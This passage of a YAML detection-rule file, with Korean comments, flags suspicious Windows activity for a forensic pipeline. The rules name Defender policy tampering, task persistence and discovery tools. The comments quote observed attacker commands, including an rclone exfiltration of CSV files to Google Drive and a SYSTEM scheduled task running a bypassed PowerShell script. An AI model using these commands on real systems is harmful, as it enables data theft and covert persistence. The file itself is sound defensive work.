      적중 실측(세 노드, Sysmon EID 1 명령행 15,605건): 18건. 전부 MGMT 의
      settlements 테이블 덤프이고 **오탐 0건**이다. 17건이 10분 간격
      반복(예약 작업이 돌린 것)이고 1건은 2026-09-03 의 예행
      (`-o C:\Windows\Temp\loot.csv`)이다.

      **`-o` 와 조합하지 않았다.** 규칙의 절은 값을 OR 로 본다 — AND 를
      쓰려면 handler 가 필요한데, 지금 측정에서 `select * from` 만으로
      오탐이 0이라 파이썬으로 내려보낼 근거가 없다(`handler` 머리말).
      나중에 조건 없는 조회를 정상적으로 하는 환경이 나오면 그때 좁힌다.

      **`queryout`(bcp)·`export-csv` 는 0건이라 안 넣었다.** 같은 뜻의 다른
      관용구지만 이 증거에 없다.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_contains
          field: fields.CommandLine
          values:
            - 'select * from'

  security_tool_config_changed:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 명령행이 보안 제품·정책 키를 건드리는 것
    note: |
      기존 defender_disabled 는 evtx:Defender 채널이 스스로 남긴 것을 본다.
      이쪽은 **바깥에서 정책 키를 고치는 행위**를 본다 — Defender 가 꺼진 뒤에는
      그 채널에 아무것도 안 남으므로 둘이 겹치지 않는다.

      K-KIOSK-USB-0908 에서 reg.exe 가 Policies\Microsoft\Windows Defender 아래를
      12건 연속으로 고쳤는데 전부 flags 가 비어 있었다(2026-09-08).
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_contains
          field: fields.CommandLine
          values:
            - '\policies\microsoft\windows defender'
            - 'disableantispyware'
            - 'disablerealtimemonitoring'
            - 'add-mppreference'
            - 'set-mppreference'

  persistence_command:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 명령행이 자동 실행 자리를 만드는 것
    note: |
      기존 scheduled_task_changed 는 evtx:Security 의 4698 계열을 본다. 감사
      설정이 꺼져 있으면 그쪽에 아무것도 안 남으므로 명령행에서도 같은 사실을
      본다.

      단독 생성 옵션만 보면 다른 도구까지 걸리므로 작업 이름 옵션과 붙은
      형태로 좁혔다. **도구 이름으로 쓰면 안 된다** — 실제 명령행은
      "C:\Windows\system32\schtasks.exe" /create /tn ... 이라 따옴표가 사이에
      끼어, 도구 이름과 옵션을 붙여 쓴 값으로는 안 걸린다(2026-09-08 확인).
      K-KIOSK-USB-0908 의 Autorun_s_ps1 등록이 이 자리다.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_contains
          field: fields.CommandLine
          values:
            - '/create /tn'
            # **`/create /tn` 은 옵션 순서를 가정한 값이었다.** 2026-09-10 에
            # 더했다 — 세 노드 실측(`K2L-20260908`)에서 공격자가
            # `/create /sc MINUTE /mo 10 /tn WindowsTelemetry /tr "powershell
            # -ep bypass ... C:\exfil\sync.ps1" /ru SYSTEM` 으로 10분마다 도는
            # 작업을 걸었는데, 주기 옵션이 `/create` 와 `/tn` 사이에 끼어
            # 아무것도 안 붙었다. 두 값이 붙어 있기를 바라는 것은 명령행에
            # 대해 하면 안 되는 가정이다.
            #
            # **`/tr` 을 고른 이유가 뜻에 있다.** 그 옵션은 "이 작업이 무엇을
            # 실행하나"이고 이 flag 가 보려는 것이 바로 그것이라, 순서와
            # 무관하게 한 번은 나온다.
            #
            # 적중 실측(세 노드, Sysmon EID 1 명령행 15,605건):
            #   '/create /tn'  2건 (키오스크의 Autorun_s_ps1 둘)
            #   '/tr '         3건 (위 둘 + MGMT 의 WindowsTelemetry), 오탐 0건
            #
            # **`-tr` 은 안 넣었다** — 같은 증거에 0건이라 넣을 근거가 없다.
            # 붙임표 형태가 관측되면 그때 잰다.
            - '/tr '
            - 'register-scheduledtask'
            - 'currentversion\run'

  discovery_command:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 사용자·권한·네트워크 상태를 훑는 정찰 명령
    note: |
      **한 건은 아무것도 아니다.** 관리자도 whoami 를 친다. 뜻은 **짧은 시간에
      여러 개가 몰릴 때** 생기고 그 판단은 05단계 몫이다 — 이 flag 는 "이
      레코드가 그 부류다"까지만 말한다.

      K-KIOSK-USB-0908 에서 셸 획득 뒤 2분 사이에 whoami·whoami /priv·
      whoami /groups·net user·ipconfig /all·arp -a·netstat -an 이 몰려 떴는데
      전부 flags 가 비어 있었다(2026-09-08).

      **net.exe·net1.exe 는 뺐다.** 같은 증거에서 net 계열만 475건이 뜬다 —
      이 호스트는 감시 에이전트가 net accounts·net user administrator 를 상시
      돌린다. 목록에 두면 이 flag 하나가 Sysmon 전체의 8.7% 에 붙어 필터가
      일을 안 한다. 지금 목록은 17건(0.3%)이다.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_endswith
          field: fields.Image
          values:
            - '\whoami.exe'
            - '\arp.exe'
            - '\netstat.exe'
            - '\nltest.exe'
            - '\systeminfo.exe'
            - '\quser.exe'

  execution_from_unusual_path:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 실행 파일이 정상 설치 자리가 아닌 곳에 있는 것
    note: |
      **이름이 아니라 자리로 가른다.** 공격자가 무엇을 실행할지는 모르지만
      **어디에 놓을 수 있는지는 안다** — 권한 없이 파일을 떨어뜨릴 수 있는
      곳은 정해져 있다. 키오스크의 정상 앱은 Program Files 나 전용 설치
      경로에 있고 이런 자리에서 실행되지 않는다.

      shell_spawned 가 못 잡는 것을 겨냥한다. USB 로 들여온 banker.exe 는
      셸이 아니라서 그 목록에 걸리지 않지만, Temp 나 Public 에서 실행되면
      여기 걸린다.

      경로 조각 앞뒤에 구분자를 붙인 것은 부분 일치가 헐거워서다 —
      `\temp\` 가 아니라 `temp` 로 쓰면 `C:\Program Files\Tempo\` 가 걸린다.

      **ProgramData 는 일부러 뺐다.** K-001 의 Mock POS 가 거기 놓일
      예정이라(mappings/windows/T1565.001.yaml 의 pos_db_root) 넣으면 정상
      POS 실행이 전량 걸린다. POS 설치 경로가 정해지면 다시 판단한다 —
      docs/limitations.md.

      **실물 Sysmon 로그로 대조한 적이 없다.** fields.Image 가 우리가 아는
      형태(`C:\...`)로 오는지 확인하지 못했다. 형식이 다르면 이 룰은 아무것도
      못 잡는다 — 조용하지만 **전량을 잡는 것보다는 낫다**(아래 참조).
    rule:
      when:
        # 시스템 볼륨이 아닌 곳. USB 에서 **직접** 실행한 경우가 여기 걸린다.
        #
        # C: 를 부정하지 않고 나머지를 열거한 이유는 flagging.py 의
        # field_startswith docstring 에 있다 — 부정으로 쓰면 형식 가정이
        # 틀렸을 때 전량이 걸려 필터가 죽는다.
        #
        # **정상 D: 파티션이 있는 랩이면 그 줄을 지운다.** 지우기 쉬우라고
        # 한 줄에 하나씩 늘어놓은 것이기도 하다.
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_startswith
          field: fields.Image
          values:
            - 'a:\'
            - 'b:\'
            - 'd:\'
            - 'e:\'
            - 'f:\'
            - 'g:\'
            - 'h:\'
            - 'i:\'
            - 'j:\'
            - 'k:\'
            - 'l:\'
            - 'm:\'
            - 'n:\'
            - 'o:\'
            - 'p:\'
            - 'q:\'
            - 'r:\'
            - 's:\'
            - 't:\'
            - 'u:\'
            - 'v:\'
            - 'w:\'
            - 'x:\'
            - 'y:\'
            - 'z:\'
            - '\\'

        # 권한 없이 파일을 떨어뜨릴 수 있는 자리. USB 에서 직접 실행하지
        # 않고 로컬로 복사한 뒤 실행하는 경우를 받는다.
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_contains
          field: fields.Image
          values:
            - '\appdata\local\temp\'
            - '\appdata\roaming\'
            - '\windows\temp\'
            - '\users\public\'
            - '\$recycle.bin\'
            - '\perflogs\'
            # **볼륨 루트의 temp.** 2026-09-09 에 더했다 — 위 두 temp 는
            # 시스템·사용자 temp 라 `C:\Temp` 처럼 사람이 만든 최상위
            # 폴더를 못 잡았다. 실측(`IR-20260908-KIOSK`)에서 공격자가
            # `C:\Temp\nmap\Nmap\nmap.exe` 로 포트 스캐너를 돌렸는데 이
            # 룰이 아무것도 붙이지 않았다.
            #
            # **`\temp\` 가 아니라 `:\temp\` 인 이유가 측정에 있다.** 앞을
            # 열어 두면 `C:\Program Files (x86)\Microsoft\Temp\...\
            # MicrosoftEdgeUpdate.exe` 가 걸린다(세 노드에서 2건). 그 자리는
            # 권한이 있어야 쓰는 곳이라 이 룰의 취지가 아니다. 드라이브
            # 문자를 안 박고 `:` 로 여는 것은 D: 볼륨에서도 같게 걸리라고.
            #
            # 적중 실측(세 노드, Sysmon EID 1 15,605건): 이 조각으로 3건이
            # 늘고 전부 위 nmap 이다. 오탐 0건.
            #
            # **이 값이 마지막 열거다**(2026-09-10). 다음 자리부터는
            # execution_outside_known_volume_root 가 맡는다.
            - ':\temp\'

  execution_outside_known_volume_root:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 실행 파일이 볼륨 루트에 사람이 만든 폴더 안에 있는 것
    note: |
      **열거가 못 따라가는 자리다.** execution_from_unusual_path 는 아는
      폴더만 잡는다 — `C:\Temp` 를 넣으려고 `:\temp\` 를 더한 것이
      2026-09-09 이고, 다음 사건은 `C:\exfil` 이었다(`K2L-20260908`):

        SYSMON#42151  flags=[]
          "C:\exfil\rclone.exe" --config ... copy C:\exfil\ gdrive:K001-exfil
          --include *.csv

      여기에 `:\exfil\` 을 적으면 이 표본에서만 맞는 값이 남는다. 그것은
      `mappings/_attention_signals.yaml` 머리말이 하지 말라고 적어 둔
      것이고, 다음 폴더 이름은 또 다를 것이다.

      그래서 이름이 아니라 **자리**로 본다 — 윈도우가 볼륨 루트에 만드는
      폴더는 정해져 있고(`flagging.KNOWN_VOLUME_ROOTS`), 그 밖의 최상위
      폴더는 누군가 만든 것이다. 목록 비교가 들어가므로 handler 다.

      **execution_from_unusual_path 에 절로 붙이지 않은 이유가 구조에 있다.**
      `handler` 는 `when` 과 AND 로 묶인다(`FlagRule.matches`). 붙였으면
      기존 두 절이 잡던 `\appdata\local\temp\` 가 전부 죽는다 — 그쪽 최상위
      폴더는 `users` 라 이 handler 가 거짓을 낸다. 뜻도 다르다: 저쪽은
      "권한 없이 떨어뜨릴 수 있는 자리"이고 이쪽은 "누가 이 폴더를
      만들었나"다.

      적중 실측(세 노드, Sysmon EID 1 15,605건): **55건(0.35%)** —
      sql2025 25 / exfil 22 / sql2022 5 / temp 3. execution_from_unusual_path
      와 겹치는 것은 3건(`:\temp\` 가 잡던 nmap)이라 새로 표시되는 것은
      52건이고, 그중 22건이 이 사건의 rclone 유출이다.

      **오탐이 30건(55%)이다.** sql2025·sql2022 는 SQL Server 를 볼륨 루트에
      설치한 것이다. 비율은 높지만 **모수가 작아** 필터를 죽이지 않는다 —
      EID 1 전체의 0.19% 이고, discovery_command 가 net.exe 를 뺀 기준
      (한 flag 가 Sysmon 의 8.7%)과는 자릿수가 다르다.

      그래도 두는 것은 이 flag 가 악성 판정이 아니라 **"정상 설치 자리가
      아니다"까지만 말하기 때문**이고, 볼륨 루트에 설치된 SQL Server 에
      대해 그 판정 자체는 맞기 때문이다. 뜻을 정하는 것은 05단계다.

      **`sql2025` 를 KNOWN_VOLUME_ROOTS 에 넣지 않았다.** 넣으면 이
      표본에서만 맞는 값이 코드에 남아, 열거를 피하려고 만든 이 룰의 취지를
      스스로 어긴다. 같은 오탐이 다른 증거에서도 나오면 그때 "설치 관리자가
      만든 자리"라는 **일반 근거**로 다시 본다.
    rule:
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
      handler: outside_known_volume_root

  unexpected_parent_process:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 1 중 부모가 키오스크에서 나올 수 없는 프로세스인 것
    note: |
      "무엇이 실행됐나"가 아니라 **"누가 실행시켰나"** 를 본다. 이것도
      이름을 모르는 상태에서 쓸 수 있는 기준이다.

      Assigned Access 로 잠긴 키오스크에서는 셸이 주문 UI 로 대체되어
      explorer.exe 가 사용자 프로세스의 부모가 되지 않는다. 그래서 여기
      explorer 가 부모로 나오면 그 자체가 제한 환경을 벗어난 정황이다.

      **이 전제는 초기 접근 모델에 달려 있다**(설계서 §1.3). M1(현실
      오구성)에서는 서드파티 키오스크 SW 가 explorer 위에서 도는 경우가
      있어 정상 부모가 될 수 있다. 그때는 이 룰이 전량을 잡는다 — 랩
      구성이 정해지면 다시 봐야 한다.

      스크립트 호스트와 문서 뷰어를 함께 넣은 것은, 그것이 부모라는 것이
      곧 "문서/스크립트가 무언가를 실행시켰다"이기 때문이다.

      **handler 가 같은 프로그램의 내부 동작을 걷어낸다.** 아래 목록에는
      브라우저가 들어 있는데, 요즘 브라우저는 탭·GPU·유틸리티 프로세스로
      자기 자신을 여러 번 띄운다. 그것은 "누가 실행시켰나"에 대해 아무 말도
      하지 않으면서 부모 이름만 보는 이 룰에 걸린다. 실측(K-LIVE-0902-wide,
      2026-09-03)에서 **258건 중 193건(75%)**이 그 경우였다 —
      msedge → msedge 157건, msedge → identity_helper 36건.

      handler 는 이름이 아니라 **관계**를 본다(Image 와 ParentImage 가 같은가,
      자식이 부모 전용 디렉터리 하위인가). 그래서 Edge 를 아는 것이 아니라
      다중 프로세스 프로그램 전반이 함께 걸러지고, explorer → cmd.exe 아홉
      건과 explorer → powershell.exe 다섯 건은 그대로 남는다.

      **남는 오탐은 이 handler 로 못 고친다.** explorer 가 자동 시작 앱
      (OneDrive·vmtoolsd 등)을 띄우는 것은 일반 데스크톱에서 정상이고,
      키오스크에서는 정상이 아니다 — 즉 룰의 전제가 이 이미지에서 성립하지
      않는 것이지 룰이 틀린 것이 아니다. 그것을 이름 목록으로 지우는 것은
      화이트리스트 역탐지이고, 베이스라인 없이 넣지 않기로 했다
      (docs/limitations.md).
    rule:
      handler: parent_is_another_program
      when:
        - artifact: evtx:Sysmon
          event_ids: [1]
          match: field_endswith
          field: fields.ParentImage
          values:
            - '\explorer.exe'
            - '\userinit.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\acrord32.exe'
            - '\iexplore.exe'
            - '\msedge.exe'
            - '\chrome.exe'
            - '\firefox.exe'

  network_connection:
    artifacts: [evtx:Sysmon]
    condition: Sysmon 3(네트워크 연결)·22(DNS 질의)
    note: |
      Stage 4b·7의 근거. 단독으로는 약한 신호이고, 값은 "어느 프로세스가
      어디로 붙었는가"를 다른 단계의 프로세스와 맞춰 보는 데 있다.

      network_state_changed(NetworkProfile 10000/10001)와 이름을 나눈 것은
      뜻이 다르기 때문이다. 저쪽은 "네트워크에 붙어 있었는가"이고 이쪽은
      "이 프로세스가 통신했는가"다.
    rule:
      when:
        - artifact: evtx:Sysmon
          match: event_id
          values: [3, 22]

  device_connected:
    artifacts: [evtx:DriverFrameworks, evtx:KernelPnP, evtx:System, evtx:Security]
    condition: 외부 장치 연결·설치 이벤트
    note: |
      Stage 1. 채널 둘이 같은 사실을 다르게 남긴다 — DriverFrameworks 는
      연결/해제 시각을, Kernel-PnP 는 장치 설치를 남긴다. 어느 쪽이 남을지가
      장치와 드라이버 상태에 따라 달라서 둘 다 본다.

      **이벤트 ID는 공개 자료 기준 추정치다.** 실제 증거로 대조하지 않았다 —
      docs/limitations.md 3-7.
      evtx:Security 6416은 외부 장치(PnP/USB/HID 등) 인식 이벤트다.
    rule:
      when:
        - artifact: evtx:DriverFrameworks
          match: event_id
          values: [2003, 2004, 2005, 2006, 2010, 2100, 2101, 2102, 2105, 2106]
        - artifact: evtx:KernelPnP
          match: event_id
          values: [400, 410, 411, 420, 430]
        # T1200 이 예전부터 요청하던 자리인데 받을 플래그가 없었다.
        # **artifact 를 evtx:* 로 쓰면 안 된다** — 10000 을 NetworkProfile 이
        # "네트워크 연결"로 쓰기 때문이다(EventID 는 제공자 안에서만 유일).
        - artifact: evtx:System
          match: event_id
          values: [20001, 10000]
        - artifact: evtx:Security
          match: event_id
          values: [6416]

  kiosk_restriction_event:
    artifacts: [evtx:AssignedAccess, evtx:AssignedAccessAdmin, evtx:AssignedAccessBroker]
    condition: Assigned Access 채널에 남은 모든 이벤트
    note: |
      Stage 3. **event_id 로 좁히지 않는다.** 세 채널 다 로그가 작고, 여기
      남는 것 자체가 키오스크 구성·세션·이탈 시도와 관련된 사건이다. 좁히려면
      어느 ID가 무엇인지 알아야 하는데 그것을 실물로 확인하지 못했다.

      전 레코드에 붙는 플래그는 필터 역할을 못 한다는 원칙의 예외다. 근거는
      "로그가 작다"이고, 그 전제가 깨지면(키오스크가 이 채널을 수만 건 남기면)
      다시 좁혀야 한다.
    rule:
      when:
        - artifact: evtx:AssignedAccess
        - artifact: evtx:AssignedAccessAdmin
        - artifact: evtx:AssignedAccessBroker

  remote_session:
    artifacts: [evtx:RDPConnection, evtx:RDPSession]
    condition: 원격 연결 인증(1149)·세션 로그온/셸 시작/재연결(21·22·24·25)
    note: |
      Stage 4b. Security 4624 Type 10 과 같은 사건을 다른 각도에서 남긴다 —
      저쪽은 "누가 로그온했는가"이고 이쪽은 "어느 세션이 언제 열렸는가"다.
      둘을 맞춰 보면 원격 접속의 출처와 지속 시간이 갈린다.
    rule:
      when:
        - artifact: evtx:RDPConnection
          match: event_id
          values: [1149]
        - artifact: evtx:RDPSession
          match: event_id
          values: [21, 22, 23, 24, 25, 39, 40]

  app_crash:
    artifacts: [evtx:Application]
    condition: 애플리케이션 오류(1000)·WER 보고(1001)·행(1002)
    note: |
      Stage 3 보조. 키오스크 앱이 비정상 종료하면 그 아래 셸이 드러나는
      경우가 있어, 이탈 시점의 정황 증거가 된다.

      **Application 로그는 크다**(실측 8,257건). event_id 로 좁히지 않으면
      필터가 일을 안 한다.
    rule:
      when:
        - artifact: evtx:Application
          match: event_id
          values: [1000, 1001, 1002]

  timestamp_truncated:
    artifacts: [$MFT]
    condition: $SI 타임스탬프의 100ns 자리가 전부 0
    note: |
      K-001 Stage 5의 두 번째 탐지 포인트. timestamp_mismatch 가 못 잡는
      경우를 겨냥한다 — $SI 와 $FN 을 함께 조작하면 방향 비교가 통과하는데,
      그때도 서브초는 대개 0으로 남는다.

      "존재하는 $SI 시각이 둘 이상이고 그것이 전부 서브초 0"이 조건이다.
      하나만 보면 우연히 걸리는 것이 반드시 나온다. 근거와 실측 오탐률은
      flagging.py 의 si_subsecond_zeroed docstring 에 있다.
    rule:
      when:
        - artifact: $MFT
      handler: si_subsecond_zeroed

  account_modified:
    artifacts: [evtx:Security]
    condition: 계정·그룹 객체의 속성 변경(4722·4723·4724·4725·4726·4738·4735·4737)
    note: |
      account_created(4720)의 짝이다. 계정을 새로 만들지 않고 **이미 있는
      계정을 되살리거나 비밀번호를 초기화해** 쓰는 경로가 있고, 그때는
      4720 이 남지 않는다.

      그룹 객체 변경(4735·4737)도 여기 든다. 새 이름을 만들 만큼 다른
      사실이 아니고, 권한 상승의 결정적 근거인 "그룹에 누구를 넣었나"는
      privileged_group_add 가 따로 받는다.

      **비밀번호 초기화(4724)와 변경(4723)은 다르다.** 4723 은 본인이
      바꾼 것이고 4724 는 남이 초기화한 것이라 후자가 더 강한 신호인데,
      둘을 가르는 것은 필드를 읽는 05단계의 몫이다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [4722, 4723, 4724, 4725, 4726, 4735, 4737, 4738]

  session_state_changed:
    artifacts: [evtx:Security]
    condition: 로그오프(4634·4647)와 세션 연결 해제·재연결(4778·4779)
    note: |
      logon_success 의 짝이다. 단독으로는 약하고, 쓰임은 **세션이 언제
      끝났는가**를 대는 데 있다 — 침해 행위가 어느 세션 안에서 일어났는지
      가르려면 시작과 끝이 다 있어야 한다.

      network_state_changed 와 이름을 맞췄다. 저쪽이 "네트워크가 붙어
      있었는가"이고 이쪽은 "세션이 살아 있었는가"다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [4634, 4647, 4778, 4779]

  scheduled_task_changed:
    artifacts: [evtx:Security]
    condition: 예약 작업 생성(4698)·삭제(4699)·수정(4702)
    note: |
      **T1053.005 매핑이 예전부터 요청하던 자리인데 받을 플래그가
      없었다**(2026-08-25 발견). 선별은 정확히 골라 왔고 04단계가 파싱까지
      했는데 모델에는 한 건도 가지 않았다 — 게이트 4가 조용히 실패하는
      전형이다.

      예약 작업 감사는 기본으로 켜져 있지 않다. 안 켜진 시스템에서는
      이 채널이 비고, 그것은 "없었다"가 아니라 "안 남았다"이다.
    rule:
      when:
        - artifact: evtx:Security
          match: event_id
          values: [4698, 4699, 4700, 4701, 4702]

  outside_time_range:
    artifacts: [$MFT, $UsnJrnl, evtx:Security, evtx:System, evtx:Firewall,
                evtx:BITS, evtx:NetworkProfile, evtx:Sysmon, evtx:DriverFrameworks,
                evtx:KernelPnP, evtx:AssignedAccess, evtx:AssignedAccessAdmin,
                evtx:AssignedAccessBroker, evtx:RDPConnection, evtx:RDPSession,
                evtx:Application, prefetch, recentfilecache]
    condition: 선별된 시간 범위 밖
    note: |
      범위 밖이라도 버리지 않고 표시만 한다. 시간 범위 추론이 틀렸을 때
      원인을 되짚으려면 레코드가 남아 있어야 한다.

      scope 를 알아야 판정되므로 handler 다. 03단계 산출물이 없으면
      (scope=None) 절대 붙지 않는다.
    rule:
      when:
        - artifact: "*"
      handler: outside_selected_time_range

# 05단계 배분에서 **사고 시간창 밖이어도 1순위를 유지하는** 플래그.
# allocation._rank 가 읽는다.
#
# **flags 룰이 아니다.** 여기 이름을 적는다고 플래그가 붙지는 않는다.
# prompt_keep_paths 와 같은 성격이다 — 판단을 코드가 아니라 어휘로 둔다.
#
# 왜 있나 (K-LIVE-0907-wide 실측, 2026-09-07). 0순위(신호) 정렬이
# 시각 오름차순이라 **오래된 신호가 먼저 나갔다.** 전달 60건 중 42건이
# 창 밖이었고, 창 안 신호 1,356건 — 사고 당일의 shell_spawned 를 포함해 —
# 이 한 건도 모델에 가지 않았다. 그래서 창 밖을 후순위로 내린다.
#
# **그런데 전부 내리면 안 된다.** 공격자의 잠복과 사전 작업이 창 밖에
# 남는다. 이 케이스의 testuser 계정 생성도 사고 5일 전이다. 그래서
# "창 밖이어도 1순위" 인 이름을 여기 적는다.
#
# 가르는 기준은 둘이다.
#
#   ① 상태를 바꾸는 것    계정·권한·서비스·작업·장치 — 한 번 일어나면 남는다
#   ② 방어를 끄는 것       Defender·방화벽
#   ③ 흔적을 지우는 것     타임스탬프 조작
#
# **시간에 비례해 쌓이는 사건형은 넣지 않는다** — file_created·logon_success·
# network_connection 처럼 대량으로 쌓이는 것이 여기 들어오면 후순위로 내린
# 뜻이 사라진다. shell_spawned·powershell_logged 도 같은 이유로 뺐다.
# 창 안이면 어차피 1순위이므로 손해가 아니다.
#
# **모르는 이름은 로드 시점에 거부된다.** 오타가 조용히 아무 일도 하지
# 않는 것이 이 파일에서 이미 두 번 물린 자리다(docs/limitations-log.md
# 2026-09-01 "매핑이 모르는 키를 써도 아무도 말하지 않았다").
window_independent:
  # ① 상태를 바꾸는 것
  - account_created
  - account_modified
  - privileged_group_add
  - service_installed
  - service_config_changed
  - scheduled_task_changed
  - device_connected
  # ② 방어를 끄는 것
  - defender_disabled
  - firewall_config_changed
  # ③ 흔적을 지우는 것
  - timestamp_mismatch
  # 로그 삭제는 **지웠다는 사실 자체가 유일한 흔적**이라, 언제 지웠든 본다.
  - log_cleared

# 볼륨 루트에서 **정상으로 볼** 최상위 폴더. execution_outside_known_volume_root
# 의 handler 가 참조한다. privileged_groups 와 같은 규약이다 — 판정은 파이썬이
# 하고, 그 사이트에서 무엇이 정상인가는 여기가 정한다.
#
# **윈도우 폴더는 안 적는다.** flagging.DEFAULT_KNOWN_VOLUME_ROOTS 가 이미 갖고
# 있고 이 목록은 거기에 더해진다. 다시 적게 하면 한 줄 빠뜨리는 순간
# `C:\Windows` 전체가 걸린다.
#
# **여기 적는 것은 그 환경의 앱이다.** K-001 의 키오스크 주문 앱이
# `C:\kiosk\order.exe` 에 설치된다(tests/test_flagging.py 가 못 박은 계약).
# 안 적으면 정상 주문 앱 실행이 전량 걸려 필터가 일을 안 한다 —
# execution_from_unusual_path 가 ProgramData 를 뺀 것과 같은 판단이다.
#
# **이 목록에 적는 것은 "여기 있으면 정상"이라고 선언하는 것이다.** 공격자가
# 그 폴더에 파일을 놓으면 이 flag 는 침묵한다. 그래서 실제로 그 앱이 설치된
# 자리만 적고, 넓게 잡지 않는다.
# 이 사이트에서 정상으로 볼 목적지 포트. uncommon_destination_port handler 가
# 기본 목록(flagging.DEFAULT_SERVICE_PORTS) **위에** 얹는다 — 대체가 아니라
# 합집합이라, 여기에 443 을 다시 적을 필요가 없다.
#
# **지금은 비워 둔다.** Test1 에서 이 환경 앱의 API 포트(5000·5001·5002)가
# 8건 걸리는데, 그것을 여기 적으면 이 랩에만 맞는 값이 된다. 데이터셋이
# 하나뿐이라 그 값이 맞는지 잴 수단이 없다(`docs/limitations.md` 3-5).
# 운영 환경에 얹을 때 그 사이트의 서비스 포트를 적는 자리다.
service_ports:
  - 1514
  - 5000
  - 5001
  - 5002

known_volume_roots:
  - kiosk

# 특권 그룹 판정 기준. privileged_group_add 의 handler 가 참조한다.
# 이쪽은 예전부터 런타임에 읽던 값이라 이름만 추가하면 바로 반영된다.
privileged_groups:
  - Administrators
  - Domain Admins
  - Enterprise Admins
  - Backup Operators
  - Remote Desktop Users

# 05단계가 프롬프트에 실을 때 fields 안의 긴 목록을 상한까지 자르는데
# (allocation.MAX_LIST_ITEMS), 그 상한 안에 **먼저 넣을** 항목의 기준이다.
# allocation.for_prompt 가 읽는다.
#
# **flags 룰이 아니다.** 여기 이름을 적는다고 플래그가 붙지는 않는다.
# 그런데도 이 파일에 있는 이유는 판단의 성격이 같아서다 — "이 경로는
# 눈여겨볼 자리인가"를 코드가 아니라 어휘로 정해 두는 것.
#
# **execution_from_unusual_path 의 values 를 빌려 쓰지 않는다.** 저 룰은
# Sysmon 사정으로 고쳐질 수 있고(ProgramData 를 뺀 것이 그런 경우다),
# 그때 프리패치 자르기가 조용히 함께 바뀌면 원인을 못 찾는다. 겹치는
# 항목이 있는 것은 같은 사실을 두 곳이 각자 보고 있기 때문이다.
# 긴 목록 보존과 중립 attention 시그널은 mappings/_attention_signals.yaml의
# prompt_keep_path_groups를 단일 원본으로 사용한다.

# 05단계가 프롬프트에 실을 때 fields 에서 **통째로 빼는** 필드 이름이다.
# allocation.for_prompt 가 읽는다. 위 prompt_keep_paths 와 짝이지만 방향이
# 반대다 — 저쪽은 긴 목록에서 무엇을 남길지, 이쪽은 어떤 필드를 아예 뺄지다.
#
# **화이트리스트가 아니라 블랙리스트인 이유.** 남길 것을 적으면 목록에 없는
# 아티팩트가 조용히 빈 껍데기가 된다. $MFT 에는 timestamp 가 없고
# (si_*/fn_* 여덟이다), $UsnJrnl 은 reason 과 name 이 판단의 전부인데,
# "공통으로 남길 필드" 목록을 짜면 그런 자리가 반드시 빠진다. 그리고
# add-parser 로 새 파서가 붙을 때 목록을 빠뜨려도 아무 데도 안 남는다.
# 뺄 것을 적으면 모르는 필드는 그대로 간다.
#
# **이름은 대소문자를 무시하고 본다.** 같은 뜻의 필드가 아티팩트마다 다른
# 표기로 오는 것을 놓치는 쪽이, 열거한 이름을 지우는 것보다 나쁘다.
#
# **04_parsed/ 의 원본과 06단계 검증은 영향받지 않는다.** 프롬프트에 실을
# 사본만 얇아진다. 다만 모델이 못 본 필드는 인용할 수 없으므로, 여기 이름을
# 넣는 것은 "이 필드로는 판단하지 않기로 한다"는 뜻이다.
#
# **뺐다는 사실은 프롬프트가 말한다**(llm_client._trim_notice). 말하지 않으면
# 모델이 "해시 정보가 없다"를 근거로 쓰고, 그것은 우리가 유발한 환각이다.
#
# 실측(K-LIVE-0902-wide, 04 산출물 9,829건, 2026-09-03): 레코드 평균
# 1,057자 → 809자로 **24%** 줄었다. 절감은 전부 evtx:Sysmon 에서 나왔고
# (1,043자 → 790자, 25%), prefetch 와 evtx:Security 는 0% 다 — 프리패치는
# loaded_files 하나가 89.7% 라 이 목록으로는 줄지 않는다(그쪽은
# prompt_keep_paths 와 MAX_LIST_ITEMS 가 맡는다).
prompt_drop_fields:
  # 해시. **우리가 대조할 해시 DB 가 없다.** 06단계는 값 일치만 보므로
  # 해시가 있어도 악성 여부는 판정하지 못하고, 모델이 학습된 지식으로
  # "이 해시는 알려진 악성"이라고 쓰면 그것이 정확히 우리가 막으려는
  # 환각이다. evtx:Sysmon 전체의 5.9%.
  - Hashes

  # 상관용 GUID. **우리는 GUID 로 잇지 않는다** — 05단계는 레코드 단위로
  # 보고 ref 로 잇는다. 모델에게는 128비트 난수일 뿐이고, 넷을 합쳐
  # evtx:Sysmon 전체의 9.8% 다. 프로세스 계보가 필요해지면(3대 상관분석,
  # docs/limitations-log.md) 그때는 파이썬이 원본에서 읽어 잇는 것이 맞다.
  - ProcessGuid
  - ParentProcessGuid
  - LogonGuid
  - SourceProcessGuid
  - TargetProcessGuid

  # PE 버전 리소스. 위조할 수 있고, 우리 flags 룰 중 이 값을 보는 것이
  # 없다. 서명 검증은 이 필드가 아니라 Signed/Signature 쪽인데 그것은
  # 남긴다.
  - FileVersion
  - Company
  - Description
  - Product
  - OriginalFileName

  # 터미널 세션 번호. 세션을 가르는 판정은 LogonId 로 하고 있고
  # (privileged_group_add 등), 그쪽은 남긴다.
  - TerminalSessionId

  # PowerShell ScriptBlock 로깅 부가 메타데이터. 분할 로깅 번호와 내부 GUID 는
  # 악성 여부 판단에 기여하지 않으며 본문(ScriptBlockText)만 보면 충분하다.
  - MessageNumber
  - MessageTotal
  - ScriptBlockId

# 05단계가 소견의 claims 를 조립할 때 레코드에서 꺼내는 필드다. **순서가
# 뜻을 갖는다** — 앞에 있는 것부터 쓰고, 레코드에 있는 것만 골라 상한까지
